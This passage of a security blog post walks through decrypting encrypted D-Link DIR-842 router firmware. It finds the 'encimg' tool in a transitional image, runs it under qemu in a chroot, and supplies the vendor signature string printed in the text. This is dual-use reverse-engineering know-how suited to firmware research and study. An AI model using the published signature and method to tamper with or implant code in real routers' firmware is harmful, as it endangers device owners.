&lt;p&gt;They quite literally tell you; the firmware v3.13 must be upgraded from the transitional version of firmware v3.02b03_middle. Now our job is, figuring out how this middle firmware can decrypt future firmware versions. Not too hard right?&lt;/p&gt;
&lt;p&gt;Firstly, mainly because I’m lazy, we find the difference between the middle firmware and the unencrypted firmware from v1.0. This way we can see what was added in this firmware image.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;finding the needle in the haystack&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.10B05$ diff -qr _DIR842C1_FW302b03_middle.bin.extracted _DIR-842C1_FW301b05.bin.extracted | grep &amp;#34;Only in&amp;#34;
...
`Only in _DIR842C1_FW302b03_middle.bin.extracted/squashfs-root/usr/sbin: encimg`
...

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The diff command returns a lot of entries, we only loop through the “Only In” so we only return the results which are in the middle firmware. When spitting through all the entries one catches my eye &lt;code&gt;encimg&lt;/code&gt; which stands for &lt;code&gt;encryptimage&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now, what happends if we want to binwalk over an encrypted version of: 3.13B05? Lets try!&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;5&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;binwalking over encrypted firmware&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.13B05$ ls
DIR842C1_FW313WWb05.bin
user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.13B05$ binwalk -eM DIR842C1_FW313WWb05.bin 

Scan Time:     2023-06-24 08:31:18
Target File:   /home/user/Desktop/DIR-842/firmware_3.13B05/DIR842C1_FW313WWb05.bin
MD5 Checksum:  ae141c12535cae08e49e4876410ebb9d
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.13B05$ 

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;As you can see, we get no output. We already expected this since this firmware is encrypted. So let’s decrypt it and extract it!&lt;/p&gt;
&lt;p&gt;We think that &lt;code&gt;_DIR842C1_FW302b03_middle.bin.extracted/squashfs-root/usr/sbin/encimg&lt;/code&gt; is the binary responsible for encrypting/decrypting the image, so let’s start here. When googling around a bit for encimg, openwrt (mentioned in references) explains: key/iv can be dumped by calling strings on the encimg binary found in the filesystem. Further aiding to the feeling that encimg is responsible for encryption and decryption. When executing a &lt;code&gt;file encimg&lt;/code&gt; we get the following output: &lt;code&gt;encimg: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped&lt;/code&gt; Since my system is not MIPS based, we can do a qemu trick (as referenced in zerodayinitiative source).&lt;/p&gt;
&lt;p&gt;First we copy the firmware we want to decrypt to the /usr/sbin folder where the encimg is also present, this makes decrypting so much easier:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;6&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;6&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Copying target firmware over&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.10B05/_DIR842C1_FW302b03_middle.bin.extracted/squashfs-root$ cp /home/user/Desktop/DIR-842/firmware_3.13B05/DIR842C1_FW313WWb05.bin /home/user/Desktop/DIR-842/firmware_3.10B05/_DIR842C1_FW302b03_middle.bin.extracted/squashfs-root/usr/sbin/firmware.bin

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;7&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;7&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;emulating MIPSEL&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.10B05/_DIR842C1_FW302b03_middle.bin.extracted/squashfs-root$ cp /usr/bin/qemu-mipsel-static ./usr/sbin/
user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.10B05/_DIR842C1_FW302b03_middle.bin.extracted/squashfs-root$ sudo chroot . /bin/sh

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Once in the busybox shell, you might still need to move to the right folder (for this instance /usr/sbin) Once there we can execute the encimg file and see the following options:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;8&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;8&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;encimg&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

./encimg
no signature specified!
Usage: encimg {OPTIONS}
   -h                      : show this message.
   -v                      : Verbose mode.
   -i {input image file}   : input image file.
   -e                      : encode file.
   -d                      : decode file.
   -s                      : signature.

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The signature that this needs is found at: &lt;code&gt;/home/user/Desktop/DIR-842/firmware_3.10B05/_DIR842C1_FW302b03_middle.bin.extracted/squashfs-root/etc/config/fw_sign&lt;/code&gt; (firmware signature) which is: &lt;code&gt;wrgac65_dlink.2015_dir842&lt;/code&gt;&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;9&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;9&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;encimg decrypt&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

./encimg -d -i DIR842C1_FW313WWb05.bin -s wrgac65_dlink.2015_dir842
The file length of DIR842C1_FW313WWb05.bin is 11280544

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The encimg does not print out if it was successful, it only does “the file length”. Once the encimg has ran it’s course, we can copy the now overwritten, but decrypted image back and binwalk it.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;10&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;10&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;binwalking decrypted firmware image&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;


user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.10B05/_DIR842C1_FW302b03_middle.bin.extracted/squashfs-root/usr/sbin$ cp DIR842C1_FW313WWb05.bin ~/Desktop/DIR-842/firmware_3.13B05/firmware_decrypted.bin
user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.13B05$ ls
DIR842C1_FW313WWb05.bin  firmware_decrypted.bin
user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.13B05$ binwalk -eM firmware_decrypted.bin 

Scan Time:     2023-06-24 08:52:19
Target File:   /home/user/Desktop/DIR-842/firmware_3.13B05/firmware_decrypted.bin
MD5 Checksum:  c40930278051bbf66f24a657676dd5b4
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             DLOB firmware header, boot partition: &amp;#34;dev=/dev/mtdblock/5&amp;#34;
112           0x70            uImage header, header size: 64 bytes, header CRC: 0xA5A9FEC, created: 2019-09-10 02:41:50, image size: 1234827 bytes, Data Address: 0x80060000, Entry Point: 0x80060000, data CRC: 0xAAFF08AD, OS: Linux, CPU: MIPS, image type: Multi-File Image, compression type: lzma, image name: &amp;#34;MIPS Seattle Linux-3.3.8&amp;#34;
184           0xB8            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3641936 bytes
1245296       0x130070        PackImg section delimiter tag, little endian size: 2136320 bytes; big endian size: 10035200 bytes

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;As we can now see, we can binwalk over the decrypted image of the newest DIR-842 firmware for the AC12000 Wireless Router.&lt;/p&gt;
&lt;h1 id=&#34;4-conclusion&#34;&gt;&lt;code&gt;4&lt;/code&gt; Conclusion&lt;/h1&gt;
&lt;p&gt;Reversing this firmware was a fun practice, when we look back at the whole firmware release cycle we can conclude the following: Version 3.00 and 3.01 were completely unencrypted and had no decryption scheme in it’s firmware. When coming towards firmware 3.10 we saw a big change. Firmware 3.10 was unencrypted but held the decryption scheme for all future firmwares.&lt;/p&gt;
&lt;h1 id=&#34;5-references&#34;&gt;&lt;code&gt;5&lt;/code&gt; References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware&#34;&gt;https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.kali.org/tools/binwalk/&#34;&gt;https://www.kali.org/tools/binwalk/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://openwrt.org/inbox/toh/d-link/dir-x1860_a1&#34;&gt;https://openwrt.org/inbox/toh/d-link/dir-x1860_a1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
